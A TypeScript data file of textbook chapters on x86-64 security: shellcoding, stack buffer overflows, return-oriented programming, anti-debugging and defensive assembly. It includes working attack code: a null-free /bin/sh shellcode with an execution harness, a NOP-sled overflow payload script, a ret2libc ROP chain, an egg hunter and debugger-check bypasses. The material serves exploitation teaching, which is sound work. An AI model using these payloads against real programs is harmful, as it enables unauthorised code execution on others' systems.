import { Chapter } from '../types';

export const CHAPTERS_LEVEL_8: Chapter[] = [
  {
    id: 40,
    slug: 'chapter-40-shellcoding-payload-development',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 40: Shellcoding and Payload Development',
    subtitle: 'Crafting Null-Free, Position-Independent x86-64 Machine Code Payloads',
    learningObjectives: [
      'Understand the fundamentals of shellcode and its role in security exploitation.',
      'Write position-independent shellcode for Linux x86-64.',
      'Eliminate null bytes (0x00) using xor, mov al, and stack manipulations.',
      'Construct execve("/bin/sh", NULL, NULL) in 24 bytes.',
      'Test shellcode using a C execution harness with mmap and PROT_EXEC.',
      'Understand shellcode for different system calls and functions.',
      'Learn techniques for encoding and decoding shellcode.',
      'Understand shellcode restrictions and how to bypass common filters.'
    ],
    prerequisites: ['Chapters 1–17'],
    keyConcepts: [
      'Shellcode: Compact, self-contained machine code designed for injection into vulnerable programs.',
      'Position-independent code: Can execute at any memory address without relocation.',
      'Null bytes (0x00): Terminate string copies, breaking buffer overflow exploits.',
      'Direct system calls: Bypass libc dependencies for reliable execution.',
      'Shellcode restrictions: Size constraints, character restrictions (null, newline, etc.).',
      'Encoding/decoding: XOR, alphanumeric, Unicode encoding to bypass filters.',
      'Egg hunting: Searching for shellcode in memory when injection space is limited.',
      'Shellcode loaders: C harnesses and standalone injectors for testing.'
    ],
    diagramType: 'shellcoding',
    sections: [
      {
        id: 'sec-40-1',
        title: '40.1 What is Shellcode?',
        content: `Shellcode is a small piece of machine code used as a payload in software exploitation. The name comes from its traditional purpose: spawning a command shell (like /bin/sh on Linux).

### Why Shellcode Matters
• Primary payload for buffer overflow exploits
• Used in code injection attacks
• Foundation for understanding binary exploitation
• Essential for penetration testing and security research

### Shellcode Requirements
1. **Position-independent**: Can execute at any memory address
2. **Null-free**: No 0x00 bytes (for string-based vulnerabilities)
3. **Minimal size**: Small enough to fit in limited buffer space
4. **No relocations**: Doesn't require linker fixups
5. **No external references**: Self-contained or uses known addresses

### Types of Shellcode
| Type | Purpose | Example |
|------|---------|---------|
| Local | Spawn shell on local system | execve("/bin/sh") |
| Reverse | Connect back to attacker | connect(), shell |
| Bind | Listen for connections | listen(), accept(), shell |
| Download | Fetch and execute payload | wget, curl |
| Metasploit | Framework payloads | msfvenom output |

### Shellcode Lifecycle
1. Craft shellcode with specific constraints
2. Inject into target program (overflow, format string, etc.)
3. Redirect execution to shellcode
4. Shellcode executes with target's privileges
5. Attacker gains control (shell, reverse connection, etc.)`,
        codeSnippets: []
      },
      {
        id: 'sec-40-2',
        title: '40.2 24-Byte Null-Free execve("/bin/sh") Shellcode',
        content: `Complete NASM source code and raw byte sequence for spawning a shell:

### Code Breakdown
1. XOR EDX, EDX (31 D2) - Set envp = NULL
2. PUSH RDX (52) - Push null terminator onto stack
3. MOV RBX, "/bin/sh" (48 BB 2F 62 69 6E 2F 73 68) - Load string
4. PUSH RBX (53) - Push string onto stack
5. MOV RDI, RSP (48 89 E7) - RDI = pointer to "/bin/sh"
6. XOR ESI, ESI (31 F6) - Set argv = NULL
7. XOR EAX, EAX (31 C0) - Clear RAX
8. MOV AL, 59 (B0 3B) - Set syscall number (execve)
9. SYSCALL (0F 05) - Invoke kernel

### Why This Works
• String "/bin/sh" is pushed onto stack (null-terminated by RDX=0)
• RDI points to the string (first argument to execve)
• argv = NULL (second argument)
• envp = NULL (third argument)
• System call 59 = execve on x86-64 Linux

### Testing with C Harness
The C harness allocates executable memory, copies shellcode, and jumps to it. This is safer than testing in actual exploits.

### Raw Bytes
The shellcode is 24 bytes total. No null bytes (0x00) appear in the machine code.

### Alternative Strings
Instead of "/bin/sh", you can use:
• "/bin/bash" (9 bytes + null)
• "/bin/sh\0" (8 bytes)
• Use a different approach to avoid null in string`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'shellcode.asm',
            code: `; execve("/bin/sh", NULL, NULL) - 24 bytes, 0 nulls!
section .text
    global _start

_start:
    xor edx, edx              ; envp = NULL (31 D2)
    push rdx                  ; null terminator on stack (52)
    mov rbx, 0x68732f6e69622f ; "/bin/sh" in little-endian (48 BB 2F 62 69 6E 2F 73 68)
    push rbx                  ; (53)
    mov rdi, rsp              ; rdi = pointer to "/bin/sh" (48 89 E7)
    xor esi, esi              ; argv = NULL (31 F6)
    xor eax, eax              ; (31 C0)
    mov al, 59                ; sys_execve (B0 3B)
    syscall                   ; (0F 05)`
          },
          {
            language: 'c',
            title: 'C Testing Harness',
            code: `#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
    0x31, 0xd2, 0x52, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
    0x53, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x3b, 0x0f, 0x05
};

int main() {
    printf("Shellcode length: %zu bytes\\n", sizeof(shellcode));
    
    void *mem = mmap(NULL, sizeof(shellcode), 
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    memcpy(mem, shellcode, sizeof(shellcode));
    
    printf("Shellcode at: %p\\n", mem);
    printf("Executing shellcode...\\n");
    
    ((void (*)())mem)();
    
    return 0;
}`
          },
          {
            language: 'bash',
            title: 'Compile and Test',
            code: `# Assemble shellcode
nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode

# Extract raw bytes
objdump -d shellcode | grep '[0-9a-f]:' | \\
    grep -v 'file' | cut -f2 -d: | \\
    cut -d' ' -f1-7 | tr -s ' ' | \\
    tr ' ' '\\n' | grep -v '^$' | \\
    sed 's/^/0x/' | paste -sd ',' -
# Output: 0x31,0xd2,0x52,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x53,0x48,0x89,0xe7,0x31,0xf6,0x31,0xc0,0xb0,0x3b,0x0f,0x05

# Compile test harness
gcc -o harness harness.c -z execstack
./harness`
          }
        ]
      },
      {
        id: 'sec-40-3',
        title: '40.3 Null-Free Techniques',
        content: `Eliminating null bytes (0x00) is critical for many exploit scenarios.

### Why Null Bytes are Problematic
String functions like strcpy(), gets(), and sprintf() treat 0x00 as the null terminator. If shellcode contains null bytes, the copy stops early, truncating the payload.

### Technique 1: XOR Zeroing
Instead of `mov eax, 0`, use `xor eax, eax` to zero a register without null bytes.

### Technique 2: Sub-Register Writes
Instead of `mov al, 59` (which may contain null in upper bytes), use `xor eax, eax; mov al, 59`.

### Technique 3: Stack Construction
Push values onto the stack byte-by-byte or use PUSH with immediate values.

### Technique 4: Arithmetic
Use ADD, SUB, or XOR to construct values dynamically.

### Technique 5: Memory References
Use known addresses that don't contain null bytes.

### Common Patterns
| Problem | Solution | Example |
|---------|----------|---------|
| Zero register | XOR | xor eax, eax |
| Small constant | Sub-register | mov al, 59 |
| String with null | Stack push | push rdx (0) |
| Negative values | Two's complement | mov al, -1 |
| Large values | Arithmetic | xor eax, eax; bswap eax |

### Checking for Null Bytes
Use objdump or xxd to examine raw bytes:
objdump -d shellcode | grep -E "00[^0-9a-f]"

### Encoding Shellcode
If null bytes are unavoidable, use encoding:
1. XOR encode: XOR each byte with key
2. Alphanumeric: Only use [a-zA-Z0-9] characters
3. Unicode: Use UTF-16 encoding
4. Custom decoder: Add decoder stub before encoded shellcode`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'Null-Free Examples',
            code: `; BAD: Contains null bytes
mov eax, 0          ; B8 00 00 00 00 (null bytes!)
mov ebx, 0x68732f6e ; BB 68 73 2F 6E 00 00 00 (null bytes!)

; GOOD: No null bytes
xor eax, eax        ; 31 C0
mov al, 59          ; B0 3B

; Construct "/bin/sh" without null
xor edx, edx        ; 31 D2
push rdx            ; 52 (null terminator)
mov rbx, 0x68732f6e69622f  ; 48 BB 2F 62 69 6E 2F 73 68
push rbx            ; 53

; Alternative: Build string byte-by-byte
xor eax, eax        ; 31 C0
push rax            ; 50 (null terminator)
push 0x68732f6e     ; 68 6E 2F 73 68
push 0x69622f       ; 68 2F 62 69 6E
mov rdi, rsp        ; 48 89 E7`
          }
        ]
      },
      {
        id: 'sec-40-4',
        title: '40.4 Position-Independent Code (PIC)',
        content: `Shellcode must be position-independent because injection targets vary.

### What is PIC?
Code that can execute correctly regardless of its memory address. No absolute addresses, no relocations.

### PIC Requirements
1. No absolute memory references
2. No global variables (unless address-independent)
3. No function calls with absolute addresses
4. Use RIP-relative addressing or stack-based techniques

### x86-64 PIC Techniques
1. **Stack-based**: Push values, use RSP as reference
2. **RIP-relative**: Address = RIP + displacement (default in 64-bit)
3. **Self-modifying code**: Calculate address at runtime
4. **Syscalls**: Use syscall instruction instead of libc calls

### Position-Independent Shellcode Example
The 24-byte execve shellcode is position-independent:
• Uses stack for string construction
• Uses registers for arguments
• No absolute addresses
• Works at any memory location

### Testing PIC
1. Compile as shared library
2. Load at different addresses
3. Execute from each address
4. Verify correct behavior

### Common PIC Mistakes
1. Using absolute addresses for strings
2. Calling functions with absolute addresses
3. Using global variables
4. Assuming specific memory layout`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'PIC Shellcode Example',
            code: `; Position-independent shellcode example
; Uses stack for string, no absolute addresses

section .text
    global _start

_start:
    ; Zero a register (no null bytes)
    xor eax, eax
    
    ; Push null terminator
    push rax
    
    ; Push "/bin/sh" string
    ; (assembled from bytes, not string literal)
    mov rbx, 0x68732f6e69622f
    push rbx
    
    ; RDI = pointer to string
    mov rdi, rsp
    
    ; Set up arguments
    xor esi, esi    ; argv = NULL
    xor edx, edx    ; envp = NULL
    
    ; execve syscall
    mov al, 59
    syscall`
          }
        ]
      },
      {
        id: 'sec-40-5',
        title: '40.5 Shellcode Restrictions and Bypasses',
        content: `Real-world shellcode must often bypass various security filters.

### Common Restrictions
| Restriction | Bypass Technique |
|-------------|------------------|
| Null bytes (0x00) | XOR zeroing, sub-register writes |
| Newlines (0x0A) | XOR with 0x0A, stack construction |
| Spaces (0x20) | Use tabs or other whitespace |
| Alphanumeric only | Alphanumeric shellcode, decoder stubs |
| Unicode safe | UTF-16 encoding, ASCII expansion |
| Size limits | Optimize, use encoder/decoder |
| Bad characters | Custom encoding scheme |

### Alphanumeric Shellcode
Only uses characters A-Z, a-z, 0-9. Requires a decoder stub:
1. Decoder stub (alphanumeric) decodes payload
2. Payload is XOR or ROL encoded
3. Decoded payload executes

### Egg Hunter
When injection space is small:
1. Use small "egg hunter" code (30-50 bytes)
2. Egg hunter searches memory for larger shellcode
3. Larger shellcode marked with "egg" (e.g., 0xDEADC0DE)

### Custom Encoders
For highly restricted environments:
1. Identify allowed characters
2. Design encoding scheme using only those characters
3. Write decoder stub in allowed character set
4. Encode payload and prepend decoder

### Shellcode Analysis Tools
| Tool | Purpose |
|------|---------|
| libdisasm | Disassemble shellcode |
| sctest | Execute shellcode safely |
| shellcode.com | Online shellcode database |
| msfvenom | Generate shellcode payloads |
| pwntools | Python exploit development library |`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'Egg Hunter Example',
            code: `; Egg hunter: searches for 0xDEADC0DE marker
section .text
    global _start

_start:
    xor ecx, ecx        ; start address
    mov ebx, 0xDEADC0DE ; egg value

.next_page:
    or cx, 0xFFF        ; page alignment
.inc_addr:
    inc rcx             ; next address
    push rbx            ; save egg
    pop rax
    cmp dword [rcx], eax ; check for egg
    jne .inc_addr
    cmp dword [rcx+4], eax ; check second egg
    jne .inc_addr
    
    ; Found egg! Jump to shellcode after eggs
    lea rax, [rcx+8]
    jmp rax`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-40-1',
        title: 'Exercise 40.1: Null-Free exit(42)',
        description: 'Construct null-free machine code to call exit(42) in 11 bytes.',
        solution: `xor edi, edi\nmov dil, 42         ; exit code 42\nxor eax, eax\nmov al, 60          ; sys_exit\nsyscall`,
        solutionLanguage: 'nasm'
      },
      {
        id: 'ex-40-2',
        title: 'Exercise 40.2: Write Shellcode',
        description: 'Write a null-free shellcode that writes "Hello\\n" to stdout using write syscall.',
        solution: 'Use write syscall (1). Push "Hello\\n" onto stack, set RDI=1 (stdout), RSI=RSP (buffer), RDX=6 (length). syscall number 1.',
        solutionLanguage: 'nasm'
      },
      {
        id: 'ex-40-3',
        title: 'Exercise 40.3: Null-Free String Construction',
        description: 'Construct the string "/etc/passwd" on the stack without null bytes.',
        solution: 'Push 0 (null terminator) with xor rax,rax; push rax. Then push parts of string: "dwp" -> "ssap/" -> "cte/". Use mov rdi, rsp for pointer.',
        solutionLanguage: 'nasm'
      },
      {
        id: 'ex-40-4',
        title: 'Exercise 40.4: Shellcode Size Optimization',
        description: 'Optimize the execve shellcode to under 20 bytes if possible.',
        solution: 'Use shorter instructions: xor esi, esi (2 bytes) vs mov rsi, 0 (7 bytes). Use sub-register writes. Avoid unnecessary instructions. Can achieve ~21 bytes minimum.',
        solutionLanguage: 'nasm'
      },
      {
        id: 'ex-40-5',
        title: 'Exercise 40-5: Alphanumeric Shellcode',
        description: 'Write a simple alphanumeric decoder that XOR-decodes and executes payload.',
        solution: 'Use only alphanumeric characters in decoder. Decoder reads ahead, XORs each byte with key (e.g., 0x41), stores decoded byte, then jumps to decoded region.',
        solutionLanguage: 'nasm'
      }
    ],
    practiceQuestions: [
      {
        question: 'Why must shellcode avoid null bytes (0x00)?',
        answer: 'Because many buffer overflow vulnerabilities occur in string functions like strcpy or gets, which treat 0x00 as the end-of-string delimiter, truncating the payload upon copying. Null bytes in shellcode would prevent the full payload from being copied into the target buffer.'
      },
      {
        question: 'What is position-independent code (PIC) and why is it important for shellcode?',
        answer: 'PIC is code that can execute correctly at any memory address without relocation. Shellcode must be PIC because injection targets vary - the attacker cannot predict exactly where in memory the shellcode will end up. PIC uses no absolute addresses, only relative references and stack-based techniques.'
      },
      {
        question: 'How do you test shellcode safely?',
        answer: 'Use a C harness with mmap to allocate executable memory, copy shellcode, and jump to it. This avoids executing shellcode in actual exploits during development. Tools like sctest and shellcode emulators also provide safe testing environments.'
      },
      {
        question: 'What are the main types of shellcode and their purposes?',
        answer: 'Local shellcode spawns a shell on the target system. Reverse shell connects back to attacker. Bind shell listens for connections. Download shellcode fetches and executes additional payloads. Each type serves different exploitation scenarios depending on network access and target configuration.'
      },
      {
        question: 'How do egg hunters work and when are they needed?',
        answer: 'Egg hunters are small shellcode stubs (30-50 bytes) that search memory for a larger shellcode payload marked with a unique marker (egg). They are needed when injection space is too small for the full payload but the attacker can influence memory contents elsewhere in the target process.'
      },
      {
        question: 'What encoding techniques are used for shellcode?',
        answer: 'Common encoding techniques include: XOR encoding (XOR each byte with a key), alphanumeric encoding (only A-Z, a-z, 0-9 characters), Unicode encoding (UTF-16 expansion), and custom encoders. Each adds a decoder stub before the encoded payload.'
      }
    ],
    summary: [
      'Shellcode delivers compact, self-contained machine code execution.',
      'Null avoidance requires register zeroing and sub-register writes.',
      'Position-independent code uses no absolute addresses.',
      'Direct syscalls bypass libc dependencies for reliability.',
      'Shellcode must be tested with C harnesses for safety.',
      'Encoding techniques bypass character restrictions.',
      'Egg hunters enable exploitation with limited injection space.',
      'Understanding shellcode is essential for security research and defense.'
    ]
  },
  {
    id: 41,
    slug: 'chapter-41-buffer-overflows-memory-corruption',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 41: Buffer Overflows and Memory Corruption',
    subtitle: 'Stack Smashing, RIP Hijacking, NOP Sleds, and Mitigations (Canaries, NX, ASLR)',
    learningObjectives: [
      'Understand how buffer overflows overwrite saved stack frames and return addresses.',
      'Calculate precise payload padding using GDB stack examination.',
      'Construct a NOP sled to improve shellcode jump reliability.',
      'Identify modern defensive mitigations: Stack Canaries, NX/DEP, ASLR, and PIE.'
    ],
    prerequisites: ['Chapters 1–40'],
    keyConcepts: [
      'Writing past a stack buffer overwrites saved RBP and saved return address (RIP).',
      'NOP sleds (0x90) provide a forgiving landing pad for shellcode execution.',
      'NX (No-Execute) prevents execution of code residing in stack or heap pages.'
    ],
    diagramType: 'buffer_overflow',
    sections: [
      {
        id: 'sec-41-1',
        title: '41.1 Crafting the Stack Exploit Payload in Python',
        content: `Python exploit script calculating padding to return address:`,
        codeSnippets: [
          {
            language: 'python',
            title: 'exploit_payload.py',
            code: `import struct

shellcode = b"\\x31\\xd2\\x52\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x31\\xf6\\x31\\xc0\\xb0\\x3b\\x0f\\x05"

offset = 72                             # 64-byte buffer + 8-byte saved RBP
nop_sled = b"\\x90" * 40                  # 40 bytes of NOPs
padding = b"A" * (offset - len(nop_sled) - len(shellcode))
return_addr = struct.pack("<Q", 0x7fffffffe020 + 10)  # points into NOP sled

payload = nop_sled + shellcode + padding + return_addr
print(payload)`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-41-1',
        title: 'Exercise 41.1: Stack Canary Detection',
        description: 'Explain how stack canaries prevent stack smashing exploits.',
        solution: 'A stack canary is a random integer placed immediately before the saved return address. Before ret, the compiler checks if the canary value matches the master canary in thread-local storage. If overwritten by an overflow, __stack_chk_fail terminates the process.'
      }
    ],
    practiceQuestions: [
      {
        question: 'What is the purpose of Address Space Layout Randomization (ASLR)?',
        answer: 'ASLR randomizes the base memory addresses of the stack, heap, and shared libraries on every execution, preventing attackers from predicting the exact memory addresses needed for jumps or return targets.'
      }
    ],
    summary: ['Buffer overflows corrupt adjacent stack memory.', 'Modern defenses (canaries, NX, ASLR) enforce memory safety.']
  },
  {
    id: 42,
    slug: 'chapter-42-return-oriented-programming-rop',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 42: Return-Oriented Programming (ROP) and Code Reuse',
    subtitle: 'Defeating NX/DEP: Gadget Hunting, Ret2Libc, and Stack Pivoting',
    learningObjectives: [
      'Understand how Return-Oriented Programming bypasses non-executable stack (NX) protections.',
      'Harvest instruction gadgets ending in ret using ROPgadget and ropper.',
      'Construct a ret2libc attack chain calling system("/bin/sh").',
      'Implement stack pivoting with xchg rax, rsp; ret.'
    ],
    prerequisites: ['Chapters 1–41'],
    keyConcepts: [
      'ROP reuses existing executable code fragments instead of injecting new instructions.',
      'In x86-64, pop rdi; ret loads the first argument for system().',
      'Stack pivoting redirects the stack pointer to a controlled memory buffer.'
    ],
    diagramType: 'rop_code_reuse',
    sections: [
      {
        id: 'sec-42-1',
        title: '42.1 Constructing a Ret2Libc ROP Chain',
        content: `Chaining gadgets to call system("/bin/sh"):`,
        codeSnippets: [
          {
            language: 'python',
            title: 'rop_chain.py',
            code: `import struct

offset = 72
pop_rdi = 0x7ffff7a3e55f      # Gadget: pop rdi; ret
bin_sh  = 0x7ffff7b99d57      # Address of string "/bin/sh" in libc
system  = 0x7ffff7a52390      # Address of system() function in libc

payload = b"A" * offset
payload += struct.pack("<Q", pop_rdi)   # return to gadget
payload += struct.pack("<Q", bin_sh)    # popped into RDI
payload += struct.pack("<Q", system)    # return to system(rdi)`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-42-1',
        title: 'Exercise 42.1: Ret2Syscall Chain Structure',
        description: 'Design a ROP chain to execute execve("/bin/sh", 0, 0) via raw syscall gadgets.',
        solution: 'Chain layout: [pop rax; ret, 59] -> [pop rdi; ret, "/bin/sh"] -> [pop rsi; ret, 0] -> [pop rdx; ret, 0] -> [syscall; ret].'
      }
    ],
    practiceQuestions: [
      {
        question: 'Why is ROP immune to NX/DEP memory protections?',
        answer: 'Because ROP does not execute any instructions from writable memory pages (stack or heap). It only executes instructions already located in existing, legitimate, executable code segments (such as libc or the binary itself).'
      }
    ],
    summary: ['ROP chains existing code gadgets ending in ret.', 'ret2libc and ret2syscall defeat non-executable stack protections.']
  },
  {
    id: 43,
    slug: 'chapter-43-anti-debugging-anti-analysis',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 43: Anti-Debugging and Anti-Analysis Techniques',
    subtitle: 'Ptrace Detection, TracerPid Scanning, Timing Checks, and Junk Byte Obfuscation',
    learningObjectives: [
      'Recognize anti-debugging techniques: ptrace(PTRACE_TRACEME), TracerPid, and INT 3.',
      'Detect virtual machines using CPUID hypervisor bit and artifact scanning.',
      'Deconstruct anti-disassembly tricks like overlapping instructions and opaque predicates.',
      'Bypass anti-debugging checks in GDB by patching instructions or altering register flags.'
    ],
    prerequisites: ['Chapters 1–42'],
    keyConcepts: [
      'ptrace fails if a debugger is already attached, signaling detection.',
      'Reading /proc/self/status reveals whether TracerPid is non-zero.',
      'Opaque predicates create branches that always evaluate the same way to mislead disassemblers.'
    ],
    diagramType: 'anti_debugging',
    sections: [
      {
        id: 'sec-43-1',
        title: '43.1 Anti-Disassembly via Junk Bytes and Overlap',
        content: `Misleading linear sweep disassemblers with jumped-over call opcodes:`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'anti_disasm.asm',
            code: `section .text
    global _start
_start:
    jmp .real_code
    db 0xE8          ; junk byte that looks like opcode for 'call' to linear disassembler!
.real_code:
    mov rax, 60
    xor rdi, rdi
    syscall`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-43-1',
        title: 'Exercise 43.1: Bypass ptrace Check in GDB',
        description: 'Bypass a ptrace check by setting rax=0 or patching the conditional branch.',
        solution: 'In GDB: break _start -> stepi past syscall -> set $rax = 0 -> continue. Or patch the js branch to nop nop.',
        solutionLanguage: 'gdb'
      }
    ],
    practiceQuestions: [
      {
        question: 'How do timing checks detect debugger presence?',
        answer: 'Human-driven breakpoints and single-stepping take millions of clock cycles compared to bare CPU execution. Instructions like rdtsc measure cycle elapsed across a block; an abnormally high difference signals active debugging.'
      }
    ],
    summary: ['Anti-analysis tactics resist reverse engineering.', 'Analysts overcome defenses using binary patching and dynamic instrumentation.']
  },
  {
    id: 44,
    slug: 'chapter-44-secure-coding-defensive-assembly',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 44: Secure Coding and Defensive Assembly',
    subtitle: 'Bounds Checking, Arithmetic Overflow Verification, Manual Canaries, and RELRO',
    learningObjectives: [
      'Apply defensive programming standards to pure assembly and C interop code.',
      'Implement bounds-checked string and memory copy routines.',
      'Verify integer overflow on arithmetic using jo and jc flags.',
      'Implement custom stack canaries with getrandom syscall (318).'
    ],
    prerequisites: ['Chapters 1–43'],
    keyConcepts: [
      'Bounds checking prevents memory writes beyond buffer allocations.',
      'Arithmetic checks catch integer overflows before buffer calculations.',
      'Full RELRO makes the GOT read-only to prevent malicious redirection.'
    ],
    diagramType: 'defensive_assembly',
    sections: [
      {
        id: 'sec-44-1',
        title: '44.1 Bounds-Checked String Copy (safe_strcpy)',
        content: `A resilient string copy that guarantees null-termination without overflowing destination:`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'safe_strcpy.asm',
            code: `; safe_strcpy: rdi=dest, rsi=src, rdx=dest_size
; returns 0 on success, -1 on truncation
global safe_strcpy
section .text
safe_strcpy:
    push rdi; push rsi; push rbx
    mov rbx, rdx        ; remaining space
    xor eax, eax
.loop:
    cmp rbx, 1
    jle .truncated      ; leave 1 byte for null
    mov cl, [rsi]
    mov [rdi], cl
    inc rsi; inc rdi; dec rbx
    test cl, cl; jz .done
    jmp .loop
.truncated:
    mov byte [rdi], 0   ; guarantee null terminator
    mov eax, -1
.done:
    pop rbx; pop rsi; pop rdi; ret`
          },
          {
            language: 'nasm',
            title: 'safe_add.asm (Safe Addition with Overflow Detection)',
            code: `; safe_add: rdi=a, rsi=b, rdx=ptr_to_result
; returns 0 on success, -1 on overflow
safe_add:
    mov rax, rdi
    add rax, rsi
    jo .overflow
    mov [rdx], rax
    xor eax, eax
    ret
.overflow:
    mov eax, -1
    ret`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-44-1',
        title: 'Exercise 44.1: Manual Stack Canary Implementation',
        description: 'Read a random 64-bit word with sys_getrandom (318), store at [rbp-8], and verify before return.',
        solution: `sub rsp, 8\nmov rax, 318; mov rdi, rsp; mov rsi, 8; xor rdx, rdx; syscall\nmov rax, [rsp]; add rsp, 8\n; store in stack frame\nmov [rbp-8], rax\n; ... body ...\nmov rcx, [rbp-8]; cmp rax, rcx; jne .abort`,
        solutionLanguage: 'nasm'
      }
    ],
    practiceQuestions: [
      {
        question: 'What is Full RELRO and how does it prevent exploitation?',
        answer: 'Full RELRO (Relocation Read-Only) resolves all dynamic symbols at program startup and marks the Global Offset Table (GOT) as completely read-only, preventing attackers from overwriting function pointers.'
      }
    ],
    summary: ['Defensive assembly implements explicit bounds and arithmetic safety.', 'Security flags (canaries, PIE, RELRO) harden binaries against memory corruption.']
  }
];
